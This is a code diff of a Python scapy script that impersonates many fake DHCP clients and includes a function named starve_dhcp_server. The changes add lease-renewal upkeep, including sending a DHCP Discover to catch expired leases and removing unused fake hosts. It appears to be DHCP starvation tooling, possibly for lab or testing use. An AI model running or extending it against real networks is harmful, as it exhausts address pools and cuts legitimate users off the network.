@@ -14,9 +14,6 @@ from pyroute2 import IPRoute # Para el modo promiscuo
 from datetime import datetime
 #from pyroute2.netlink.exceptions import NetlinkError
 
-# BOOTP Flag. Defines if DHCP handshake will be performed as Unicast or Broadcast
-#bootp_flag = 0 # Unicast
-#bootp_flag = 0x8000 # Broadcast
 
 # Interface to spoof
 iface = None
@@ -215,7 +212,6 @@ def send_request(mac_address, interface):
                                      ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),
                                      ("requested_addr", ip_address), 
                                      ("hostname", hostname),
-                                     #("hostname", "elvispresley"), 
                                      "end"])
     dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
 
@@ -251,7 +247,6 @@ def send_renewal_request(host, interface):
                                      ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),
                                      ("requested_addr", ip_address), 
                                      ("hostname", hostname),
-                                     #("hostname", "elvispresley"), 
                                      "end"])
     dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
 
@@ -284,7 +279,6 @@ def send_release(mac_address, interface):
     dhcp_field = scapy.DHCP(options=[("message-type", "release"),
                                      ("server_id", dhcp_server_ip),
                                      ("hostname", hostname), 
-                                     #("hostname", "elvispresley"), 
                                      "end"])
     dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
 
@@ -555,6 +549,9 @@ def renew_hosts_ip_leases(interface):
             host.transaction_id = get_transaction_id()
             # Unicast DHCP Request to renew IP address lease
             send_renewal_request(host, interface)
+            # Since there's some DHCP servers who doesn't notify the successfull renewal, manual update of host's acquisition_time is needed
+            #global fake_host_dict
+            #fake_host_dict[host.mac_address].acquisition_time = datetime.now()
 
 
 def starve_dhcp_server(number, delay):
@@ -572,10 +569,17 @@ def ip_lease_renewal(renewal_time):
     Performs (if needed) a IP Lease Renewal on all fake hosts every 'renewal_time' seconds
     '''
     while True:
+            
             write_to_log(f"Trying IP Lease renewal...")
             renew_hosts_ip_leases(iface)
+            # Sending a DHCP Discover to catch any expired IP rease
+            send_discover(iface)
             write_to_log(f"Next try in {renewal_time} seconds")
             time.sleep(renewal_time)
+            # Removing hosts with no IP linked
+            clean_unused_fake_hosts()
+
+            
 
 
 def release_all_ips():
